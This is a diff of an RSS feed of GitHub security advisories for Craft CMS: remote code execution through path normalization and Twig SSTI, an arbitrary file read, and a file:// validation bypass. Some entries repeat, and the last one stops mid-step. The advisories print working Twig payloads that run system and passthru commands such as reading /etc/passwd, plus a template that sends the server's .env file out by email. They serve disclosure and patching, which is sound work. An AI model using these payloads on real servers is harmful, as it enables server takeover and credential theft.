@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2024-11-13T14:01:26.100Z</updated>
+    <updated>2024-11-13T15:01:17.275Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -12,6 +12,616 @@
     <category term="MODERATE"/>
     <category term="LOW"/>
     <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS vulnerable to Potential Remote Code Execution via missing path normalization & Twig SSTI]]></title>
+        <id>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</id>
+        <link href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv"/>
+        <updated>2024-11-13T14:16:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Missing <code>normalizePath</code> in the function <code>FileHelper::absolutePath</code> could lead to Remote Code Execution on the server via twig SSTI.</p>
+<p><code>(Post-authentication, ALLOW_ADMIN_CHANGES=true)</code></p>
+<h3 id="details">Details</h3>
+<p>Note: This is a sequel to <a href="https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw">CVE-2023-40035</a></p>
+<p>In <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/helpers/FileHelper.php#L106-L137"><code>src/helpers/FileHelper.php#L106-L137</code></a>, the function <code>absolutePath</code> returned <code>$from . $ds . $to</code> without path normalization:</p>
+<pre><code class="language-php">/**
+ * Returns an absolute path based on a source location or the current working directory.
+ *
+ * @param string $to The target path.
+ * @param string|null $from The source location. Defaults to the current working directory.
+ * @param string $ds the directory separator to be used in the normalized result. Defaults to `DIRECTORY_SEPARATOR`.
+ * @return string
+ * @since 4.3.5
+ */
+public static function absolutePath(
+    string $to,
+    ?string $from = null,
+    string $ds = DIRECTORY_SEPARATOR,
+): string {
+    $to = static::normalizePath($to, $ds);
+
+    // Already absolute?
+    if (
+        str_starts_with($to, $ds) ||
+        preg_match(sprintf('/^[A-Z]:%s/', preg_quote($ds, '/')), $to)
+    ) {
+        return $to;
+    }
+
+    if ($from === null) {
+        $from = FileHelper::normalizePath(getcwd(), $ds);
+    } else {
+        $from = static::absolutePath($from, ds: $ds);
+    }
+
+    return $from . $ds . $to;
+}
+</code></pre>
+<p>This could leads to multiple security risks, one of them is in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/services/Security.php#L201-L220"><code>src/services/Security.php#L201-L220</code></a> where <code>../templates/poc</code> is not considered a system dir.</p>
+<p>Let's see what happens after calling <code>isSystemDir("../templates/poc")</code>:</p>
+<pre><code class="language-php">/**
+ * Returns whether the given file path is located within or above any system directories.
+ *
+ * @param string $path
+ * @return bool
+ * @since 5.4.2
+ */
+public function isSystemDir(string $path): bool // $path = "../templates/poc"
+{
+    $path = FileHelper::absolutePath($path, '/'); // $path = "/var/www/html/web//../templates/poc"
+
+    foreach (Craft::$app-&gt;getPath()-&gt;getSystemPaths() as $dir) {
+        $dir = FileHelper::absolutePath($dir, '/'); // $dir = "/var/www/html/templates"
+        if (str_starts_with("$path/", "$dir/") || str_starts_with("$dir/", "$path/")) { // if (false || false)
+            return true;
+        }
+    }
+
+    return false; // We're here!
+}
+</code></pre>
+<p>Now that the path <code>../templates/poc</code> can bypass <code>isSystemDir</code>, it will also bypass the function <code>validatePath</code> in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/fs/Local.php#L124-L136"><code>src/fs/Local.php#L124-L136</code></a>:</p>
+<pre><code class="language-php">/**
+ * @param string $attribute
+ * @param array|null $params
+ * @param InlineValidator $validator
+ * @return void
+ * @since 4.4.6
+ */
+public function validatePath(string $attribute, ?array $params, InlineValidator $validator): void
+{
+    if (Craft::$app-&gt;getSecurity()-&gt;isSystemDir($this-&gt;getRootPath())) {
+        $validator-&gt;addError($this, $attribute, Craft::t('app', 'Local filesystems cannot be located within or above system directories.'));
+    }
+}
+</code></pre>
+<p>We can now create a Local filesystem within the system directories, particularly in <code>/var/www/html/templates/poc</code></p>
+<p>Then create a new asset volume with that filesystem, upload a <code>poc.ttml</code> file with twig code and execute using a new route with template path <code>poc/poc.ttml</code></p>
+<p>Although craftcms does sandbox twig ssti, the list in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/web/twig/Extension.php#L180-L268">src/web/twig/Extension.php#L180-L268</a> is still incomplete.</p>
+<pre><code class="language-js">{{['id'] has some 'system'}}
+{{['ls'] has every 'passthru'}}
+{{['cat /etc/passwd']|find('system')}}
+{{['id;pwd;ls -altr /']|find('passthru')}}
+</code></pre>
+<p>These payloads still work, see <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L196-L247">twigphp/Twig/src/Extension/CoreExtension.php#getFilters()</a> and <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L291-L333">twigphp/Twig/src/Extension/CoreExtension.php#getOperators()</a> for more informations.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Craft CMS was installed using <a href="https://craftcms.com/docs/4.x/installation.html#quick-start">https://craftcms.com/docs/4.x/installation.html#quick-start</a></li>
+</ol>
+<pre><code class="language-sh">mkdir craftcms &amp;&amp; cd craftcms
+ddev config --project-type=craftcms --docroot=web --create-docroot
+ddev composer create -y --no-scripts "craftcms/craft"
+ddev craft install
+php craft setup/security-key
+ddev start
+</code></pre>
+<img src="https://github.com/user-attachments/assets/f8bcc22a-6ffd-40a5-81c6-c077fa4ce1d3" alt="start" width="1280">
+
+<ol start="2">
+<li>Create a new filesystem with base path <code>../templates/poc</code></li>
+</ol>
+<img src="https://github.com/user-attachments/assets/fe78e023-bd51-4fc1-a22e-dcfa5baf266b" alt="filesystem" width="1280">
+
+<p>Notice that the <code>poc</code> directory was created</p>
+<img src="https://github.com/user-attachments/assets/ccc45ce8-8555-4aae-ae48-320a630e7d79" alt="dir" width="167">
+
+<ol start="3">
+<li>Create a new asset volume using the <code>poc</code> filesystem</li>
+</ol>
+<img src="https://github.com/user-attachments/assets/b5530766-11b4-4e45-ae58-82f81fc2db00" alt="asset" width="1280">
+
+<p>Upload a <code>poc.ttml</code> file with RCE template code</p>
+<pre><code class="language-js">{{'&lt;pre&gt;'}}
+{{ 8*8 }}
+{{['id'] has some 'system'}}
+{{['ls'] has every 'passthru'}}
+{{['cat /etc/passwd']|find('system')}}
+{{['id;pwd;ls -altr /']|find('passthru')}}
+</code></pre>
+<p>Note: <code>find</code> was added to twig <a href="https://github.com/twigphp/Twig/commit/4e262511930e408e4c7eda07b1c977f2ea98575c">last month</a>. If you're running this poc on an older version of twig try removing the last 2 lines.</p>
+<img src="https://github.com/user-attachments/assets/63e65beb-2ede-4141-85d2-e7d21cd4b8ad" alt="upload" width="1280">
+
+<p><img alt="ttml" src="https://github.com/user-attachments/assets/9db8ca9b-25eb-4014-a7f5-4ece895b106d"></p>
+<ol start="4">
+<li>Create a new route <code>*</code> with template <code>poc/poc.ttml</code></li>
+</ol>
+<img src="https://github.com/user-attachments/assets/b92d9340-b6a5-40d8-a8e8-ddab5cfc9f21" alt="route" width="1280">
+
+<ol start="5">
+<li>This leads to Remote Code Execution on arbitrary route <code>/*</code></li>
+</ol>
+<img src="https://github.com/user-attachments/assets/19765f6c-1c28-4a0b-a89c-25f6f05ceca6" alt="rce" width="454">
+
+<h3 id="remediation">Remediation</h3>
+<pre><code class="language-diff">diff --git a/src/helpers/FileHelper.php b/src/helpers/FileHelper.php
+index 0c2da884a7..ac23ce556a 100644
+--- a/src/helpers/FileHelper.php
++++ b/src/helpers/FileHelper.php
+@@ -133,7 +133,7 @@ class FileHelper extends \yii\helpers\FileHelper
+             $from = static::absolutePath($from, ds: $ds);
+         }
+
+-        return $from . $ds . $to;
++        return FileHelper::normalizePath($from . $ds . $to);
+     }
+
+     /**
+</code></pre>
+<p><img alt="fix_norm" src="https://github.com/user-attachments/assets/4c8e5b4f-6216-416c-87a1-9b9fae033971"></p>
+<p>See <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php">twigphp/Twig/src/Extension/CoreExtension.php</a> for updated filters and operators, a possible fix could look like:</p>
+<pre><code class="language-diff">diff --git a/src/web/twig/Extension.php b/src/web/twig/Extension.php
+index efff2d2412..756f452f8b 100644
+--- a/src/web/twig/Extension.php
++++ b/src/web/twig/Extension.php
+@@ -225,6 +225,9 @@ class Extension extends AbstractExtension implements GlobalsInterface
+             new TwigFilter('lcfirst', [$this, 'lcfirstFilter']),
+             new TwigFilter('literal', [$this, 'literalFilter']),
+             new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =&gt; true]),
++            new TwigFilter('find', [$this, 'find'], ['needs_environment' =&gt; true]),
++            new TwigFilter('has some' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasSomeBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
++            new TwigFilter('has every' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasEveryBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
+             new TwigFilter('markdown', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
+             new TwigFilter('md', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
+             new TwigFilter('merge', [$this, 'mergeFilter']),
+</code></pre>
+<p><img alt="fix_ssti" src="https://github.com/user-attachments/assets/5d9ce9be-022b-4853-a5f9-688b247cc27c"></p>
+<h3 id="impact">Impact</h3>
+<p>Take control of vulnerable systems, Data exfiltrations, Malware execution, Pivoting, etc.</p>
+<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat (Remote Code Execution)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv</a></li>
+<li><a href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/advisories/GHSA-f3cw-hg6r-chfv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-13T14:16:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS vulnerable to Potential Remote Code Execution via missing path normalization & Twig SSTI]]></title>
+        <id>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</id>
+        <link href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv"/>
+        <updated>2024-11-13T14:16:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Missing <code>normalizePath</code> in the function <code>FileHelper::absolutePath</code> could lead to Remote Code Execution on the server via twig SSTI.</p>
+<p><code>(Post-authentication, ALLOW_ADMIN_CHANGES=true)</code></p>
+<h3 id="details">Details</h3>
+<p>Note: This is a sequel to <a href="https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw">CVE-2023-40035</a></p>
+<p>In <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/helpers/FileHelper.php#L106-L137"><code>src/helpers/FileHelper.php#L106-L137</code></a>, the function <code>absolutePath</code> returned <code>$from . $ds . $to</code> without path normalization:</p>
+<pre><code class="language-php">/**
+ * Returns an absolute path based on a source location or the current working directory.
+ *
+ * @param string $to The target path.
+ * @param string|null $from The source location. Defaults to the current working directory.
+ * @param string $ds the directory separator to be used in the normalized result. Defaults to `DIRECTORY_SEPARATOR`.
+ * @return string
+ * @since 4.3.5
+ */
+public static function absolutePath(
+    string $to,
+    ?string $from = null,
+    string $ds = DIRECTORY_SEPARATOR,
+): string {
+    $to = static::normalizePath($to, $ds);
+
+    // Already absolute?
+    if (
+        str_starts_with($to, $ds) ||
+        preg_match(sprintf('/^[A-Z]:%s/', preg_quote($ds, '/')), $to)
+    ) {
+        return $to;
+    }
+
+    if ($from === null) {
+        $from = FileHelper::normalizePath(getcwd(), $ds);
+    } else {
+        $from = static::absolutePath($from, ds: $ds);
+    }
+
+    return $from . $ds . $to;
+}
+</code></pre>
+<p>This could leads to multiple security risks, one of them is in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/services/Security.php#L201-L220"><code>src/services/Security.php#L201-L220</code></a> where <code>../templates/poc</code> is not considered a system dir.</p>
+<p>Let's see what happens after calling <code>isSystemDir("../templates/poc")</code>:</p>
+<pre><code class="language-php">/**
+ * Returns whether the given file path is located within or above any system directories.
+ *
+ * @param string $path
+ * @return bool
+ * @since 5.4.2
+ */
+public function isSystemDir(string $path): bool // $path = "../templates/poc"
+{
+    $path = FileHelper::absolutePath($path, '/'); // $path = "/var/www/html/web//../templates/poc"
+
+    foreach (Craft::$app-&gt;getPath()-&gt;getSystemPaths() as $dir) {
+        $dir = FileHelper::absolutePath($dir, '/'); // $dir = "/var/www/html/templates"
+        if (str_starts_with("$path/", "$dir/") || str_starts_with("$dir/", "$path/")) { // if (false || false)
+            return true;
+        }
+    }
+
+    return false; // We're here!
+}
+</code></pre>
+<p>Now that the path <code>../templates/poc</code> can bypass <code>isSystemDir</code>, it will also bypass the function <code>validatePath</code> in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/fs/Local.php#L124-L136"><code>src/fs/Local.php#L124-L136</code></a>:</p>
+<pre><code class="language-php">/**
+ * @param string $attribute
+ * @param array|null $params
+ * @param InlineValidator $validator
+ * @return void
+ * @since 4.4.6
+ */
+public function validatePath(string $attribute, ?array $params, InlineValidator $validator): void
+{
+    if (Craft::$app-&gt;getSecurity()-&gt;isSystemDir($this-&gt;getRootPath())) {
+        $validator-&gt;addError($this, $attribute, Craft::t('app', 'Local filesystems cannot be located within or above system directories.'));
+    }
+}
+</code></pre>
+<p>We can now create a Local filesystem within the system directories, particularly in <code>/var/www/html/templates/poc</code></p>
+<p>Then create a new asset volume with that filesystem, upload a <code>poc.ttml</code> file with twig code and execute using a new route with template path <code>poc/poc.ttml</code></p>
+<p>Although craftcms does sandbox twig ssti, the list in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/web/twig/Extension.php#L180-L268">src/web/twig/Extension.php#L180-L268</a> is still incomplete.</p>
+<pre><code class="language-js">{{['id'] has some 'system'}}
+{{['ls'] has every 'passthru'}}
+{{['cat /etc/passwd']|find('system')}}
+{{['id;pwd;ls -altr /']|find('passthru')}}
+</code></pre>
+<p>These payloads still work, see <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L196-L247">twigphp/Twig/src/Extension/CoreExtension.php#getFilters()</a> and <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L291-L333">twigphp/Twig/src/Extension/CoreExtension.php#getOperators()</a> for more informations.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Craft CMS was installed using <a href="https://craftcms.com/docs/4.x/installation.html#quick-start">https://craftcms.com/docs/4.x/installation.html#quick-start</a></li>
+</ol>
+<pre><code class="language-sh">mkdir craftcms &amp;&amp; cd craftcms
+ddev config --project-type=craftcms --docroot=web --create-docroot
+ddev composer create -y --no-scripts "craftcms/craft"
+ddev craft install
+php craft setup/security-key
+ddev start
+</code></pre>
+<img src="https://github.com/user-attachments/assets/f8bcc22a-6ffd-40a5-81c6-c077fa4ce1d3" alt="start" width="1280">
+
+<ol start="2">
+<li>Create a new filesystem with base path <code>../templates/poc</code></li>
+</ol>
+<img src="https://github.com/user-attachments/assets/fe78e023-bd51-4fc1-a22e-dcfa5baf266b" alt="filesystem" width="1280">
+
+<p>Notice that the <code>poc</code> directory was created</p>
+<img src="https://github.com/user-attachments/assets/ccc45ce8-8555-4aae-ae48-320a630e7d79" alt="dir" width="167">
+
+<ol start="3">
+<li>Create a new asset volume using the <code>poc</code> filesystem</li>
+</ol>
+<img src="https://github.com/user-attachments/assets/b5530766-11b4-4e45-ae58-82f81fc2db00" alt="asset" width="1280">
+
+<p>Upload a <code>poc.ttml</code> file with RCE template code</p>
+<pre><code class="language-js">{{'&lt;pre&gt;'}}
+{{ 8*8 }}
+{{['id'] has some 'system'}}
+{{['ls'] has every 'passthru'}}
+{{['cat /etc/passwd']|find('system')}}
+{{['id;pwd;ls -altr /']|find('passthru')}}
+</code></pre>
+<p>Note: <code>find</code> was added to twig <a href="https://github.com/twigphp/Twig/commit/4e262511930e408e4c7eda07b1c977f2ea98575c">last month</a>. If you're running this poc on an older version of twig try removing the last 2 lines.</p>
+<img src="https://github.com/user-attachments/assets/63e65beb-2ede-4141-85d2-e7d21cd4b8ad" alt="upload" width="1280">
+
+<p><img alt="ttml" src="https://github.com/user-attachments/assets/9db8ca9b-25eb-4014-a7f5-4ece895b106d"></p>
+<ol start="4">
+<li>Create a new route <code>*</code> with template <code>poc/poc.ttml</code></li>
+</ol>
+<img src="https://github.com/user-attachments/assets/b92d9340-b6a5-40d8-a8e8-ddab5cfc9f21" alt="route" width="1280">
+
+<ol start="5">
+<li>This leads to Remote Code Execution on arbitrary route <code>/*</code></li>
+</ol>
+<img src="https://github.com/user-attachments/assets/19765f6c-1c28-4a0b-a89c-25f6f05ceca6" alt="rce" width="454">
+
+<h3 id="remediation">Remediation</h3>
+<pre><code class="language-diff">diff --git a/src/helpers/FileHelper.php b/src/helpers/FileHelper.php
+index 0c2da884a7..ac23ce556a 100644
+--- a/src/helpers/FileHelper.php
++++ b/src/helpers/FileHelper.php
+@@ -133,7 +133,7 @@ class FileHelper extends \yii\helpers\FileHelper
+             $from = static::absolutePath($from, ds: $ds);
+         }
+
+-        return $from . $ds . $to;
++        return FileHelper::normalizePath($from . $ds . $to);
+     }
+
+     /**
+</code></pre>
+<p><img alt="fix_norm" src="https://github.com/user-attachments/assets/4c8e5b4f-6216-416c-87a1-9b9fae033971"></p>
+<p>See <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php">twigphp/Twig/src/Extension/CoreExtension.php</a> for updated filters and operators, a possible fix could look like:</p>
+<pre><code class="language-diff">diff --git a/src/web/twig/Extension.php b/src/web/twig/Extension.php
+index efff2d2412..756f452f8b 100644
+--- a/src/web/twig/Extension.php
++++ b/src/web/twig/Extension.php
+@@ -225,6 +225,9 @@ class Extension extends AbstractExtension implements GlobalsInterface
+             new TwigFilter('lcfirst', [$this, 'lcfirstFilter']),
+             new TwigFilter('literal', [$this, 'literalFilter']),
+             new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =&gt; true]),
++            new TwigFilter('find', [$this, 'find'], ['needs_environment' =&gt; true]),
++            new TwigFilter('has some' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasSomeBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
++            new TwigFilter('has every' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasEveryBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
+             new TwigFilter('markdown', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
+             new TwigFilter('md', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
+             new TwigFilter('merge', [$this, 'mergeFilter']),
+</code></pre>
+<p><img alt="fix_ssti" src="https://github.com/user-attachments/assets/5d9ce9be-022b-4853-a5f9-688b247cc27c"></p>
+<h3 id="impact">Impact</h3>
+<p>Take control of vulnerable systems, Data exfiltrations, Malware execution, Pivoting, etc.</p>
+<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat (Remote Code Execution)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv</a></li>
+<li><a href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/advisories/GHSA-f3cw-hg6r-chfv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-13T14:16:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS Arbitrary System File Read]]></title>
+        <id>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</id>
+        <link href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w"/>
+        <updated>2024-11-13T14:15:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>By abusing the mail notification template it is possible to read arbitrary operating system files. </p>
+<h3 id="details">Details</h3>
+<p>The <a href="https://craftcms.com/docs/3.x/dev/functions.html#dataurl">dataUrl</a> function can be exploited if an attacker has write permissions on system notification templates. This function accepts an absolute file path, reads the file's content, and converts it into a Base64-encoded string. By embedding this function within a system notification template, the attacker can exfiltrate the Base64-encoded file content through a triggered system email notification. Once the email is received, the Base64 payload can be decoded, allowing the attacker to read arbitrary files on the server.</p>
+<p>Requirements:</p>
+<ul>
+<li>write permissions to system notification templates</li>
+<li>ability to trigger a corresponding system email</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Modify a template to contain the following twig template string:</li>
+</ol>
+<pre><code class="language-twig">{{ dataUrl('/var/www/web/.env') }}
+</code></pre>
+<ol start="2">
+<li>Trigger the corresponding notification email (e.g. by resetting a password)</li>
+<li>Receive the email and decode the base64 string</li>
+</ol>
+<p>Mail received:
+<img alt="Bildschirmfoto 2024-09-05 um 16 20 41" src="https://github.com/user-attachments/assets/24dc5196-6847-4006-b7ef-8cd10d659c30"></p>
+<p>Decoded string:
+<img alt="Bildschirmfoto 2024-09-05 um 16 28 24" src="https://github.com/user-attachments/assets/1913a475-5277-49b9-9210-2f3fcd3b9bf1"></p>
+<h3 id="impact">Impact</h3>
+<ol>
+<li><p>Exposure of Sensitive Information: Arbitrary file read can lead to the exposure of sensitive data such as configuration files (e.g., /etc/passwd, .env, config.php), which may contain credentials, API keys, or database passwords. This can provide the attacker with further access to the system or connected services.</p>
+</li>
+<li><p>Privilege Escalation: If the attacker is able to read files that contain privileged information, such as credentials for other systems or applications, they may be able to escalate their privileges beyond what the web admin role originally allowed, potentially gaining full control over the server or other related systems.</p>
+</li>
+<li><p>Server Compromise: Access to files like SSH keys, private certificates, or system configuration files can lead to the complete compromise of the underlying server. With this information, an attacker could remotely log in to the server or impersonate it in secure communications.</p>
+</li>
+<li><p>Exfiltration of User Data: The ability to read arbitrary files may allow an attacker to access user data, such as stored passwords, session tokens, or private information (like uploaded files or logs), leading to a breach of confidentiality and violating privacy regulations (e.g., GDPR).</p>
+</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
+<li><a href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-13T14:15:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS Arbitrary System File Read]]></title>
+        <id>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</id>
+        <link href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w"/>
+        <updated>2024-11-13T14:15:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>By abusing the mail notification template it is possible to read arbitrary operating system files. </p>
+<h3 id="details">Details</h3>
+<p>The <a href="https://craftcms.com/docs/3.x/dev/functions.html#dataurl">dataUrl</a> function can be exploited if an attacker has write permissions on system notification templates. This function accepts an absolute file path, reads the file's content, and converts it into a Base64-encoded string. By embedding this function within a system notification template, the attacker can exfiltrate the Base64-encoded file content through a triggered system email notification. Once the email is received, the Base64 payload can be decoded, allowing the attacker to read arbitrary files on the server.</p>
+<p>Requirements:</p>
+<ul>
+<li>write permissions to system notification templates</li>
+<li>ability to trigger a corresponding system email</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Modify a template to contain the following twig template string:</li>
+</ol>
+<pre><code class="language-twig">{{ dataUrl('/var/www/web/.env') }}
+</code></pre>
+<ol start="2">
+<li>Trigger the corresponding notification email (e.g. by resetting a password)</li>
+<li>Receive the email and decode the base64 string</li>
+</ol>
+<p>Mail received:
+<img alt="Bildschirmfoto 2024-09-05 um 16 20 41" src="https://github.com/user-attachments/assets/24dc5196-6847-4006-b7ef-8cd10d659c30"></p>
+<p>Decoded string:
+<img alt="Bildschirmfoto 2024-09-05 um 16 28 24" src="https://github.com/user-attachments/assets/1913a475-5277-49b9-9210-2f3fcd3b9bf1"></p>
+<h3 id="impact">Impact</h3>
+<ol>
+<li><p>Exposure of Sensitive Information: Arbitrary file read can lead to the exposure of sensitive data such as configuration files (e.g., /etc/passwd, .env, config.php), which may contain credentials, API keys, or database passwords. This can provide the attacker with further access to the system or connected services.</p>
+</li>
+<li><p>Privilege Escalation: If the attacker is able to read files that contain privileged information, such as credentials for other systems or applications, they may be able to escalate their privileges beyond what the web admin role originally allowed, potentially gaining full control over the server or other related systems.</p>
+</li>
+<li><p>Server Compromise: Access to files like SSH keys, private certificates, or system configuration files can lead to the complete compromise of the underlying server. With this information, an attacker could remotely log in to the server or impersonate it in secure communications.</p>
+</li>
+<li><p>Exfiltration of User Data: The ability to read arbitrary files may allow an attacker to access user data, such as stored passwords, session tokens, or private information (like uploaded files or logs), leading to a breach of confidentiality and violating privacy regulations (e.g., GDPR).</p>
+</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
+<li><a href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-13T14:15:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Local File System Validation Bypass Leading to File Overwrite, Sensitive File Access, and Potential Code Execution]]></title>
+        <id>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</id>
+        <link href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q"/>
+        <updated>2024-11-13T14:12:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A vulnerability in CraftCMS allows an attacker to bypass local file system validation by utilizing a double <code>file://</code> scheme (e.g., <code>file://file:////</code>). This enables the attacker to specify sensitive folders as the file system, leading to potential file overwriting through malicious uploads, unauthorized access to sensitive files, and, under certain conditions, remote code execution (RCE) via Server-Side Template Injection (SSTI) payloads.</p>
+<p>Note that this will only work if you have an authenticated administrator account with <a href="https://craftcms.com/docs/5.x/reference/config/general.html#allowadminchanges">allowAdminChanges enabled</a>.</p>
+<p><a href="https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production">https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production</a></p>
+<h3 id="details">Details</h3>
+<p>The issue lies in line 57 of <code>cms/src/helpers/FileHelper.php</code>, it only removes <code>file://</code> on the most left. It is trivial to bypass this sanitization by adding 2 <code>file://</code>, e.g. <code>file://file:////</code>.</p>
+<pre><code class="language-php">    public static function normalizePath($path, $ds = DIRECTORY_SEPARATOR): string
+    {
+        // Remove any file protocol wrappers
+        $path = StringHelper::removeLeft($path, 'file://');
+
+        // Is this a UNC network share path?
+        $isUnc = (str_starts_with($path, '//') || str_starts_with($path, '\\\\'));
+
+        // Normalize the path
+        $path = parent::normalizePath($path, $ds);
+
+        // If it is UNC, add those slashes back in front
+        if ($isUnc) {
+            $path = $ds . $ds . ltrim($path, $ds);
+        }
+
+        return $path;
+    }
+</code></pre>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Sign in with an admin account and navigate to <code>Settings → Assets</code>, then create a new volume.</li>
+<li>n the Asset Filesystem section, create a new file system and set the Base Path to <code>file://file:////vendor</code>.
+Without the prefix, the selection fails.
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/1.png">
+With the double <code>file://</code> prefix, the selection succeeds.
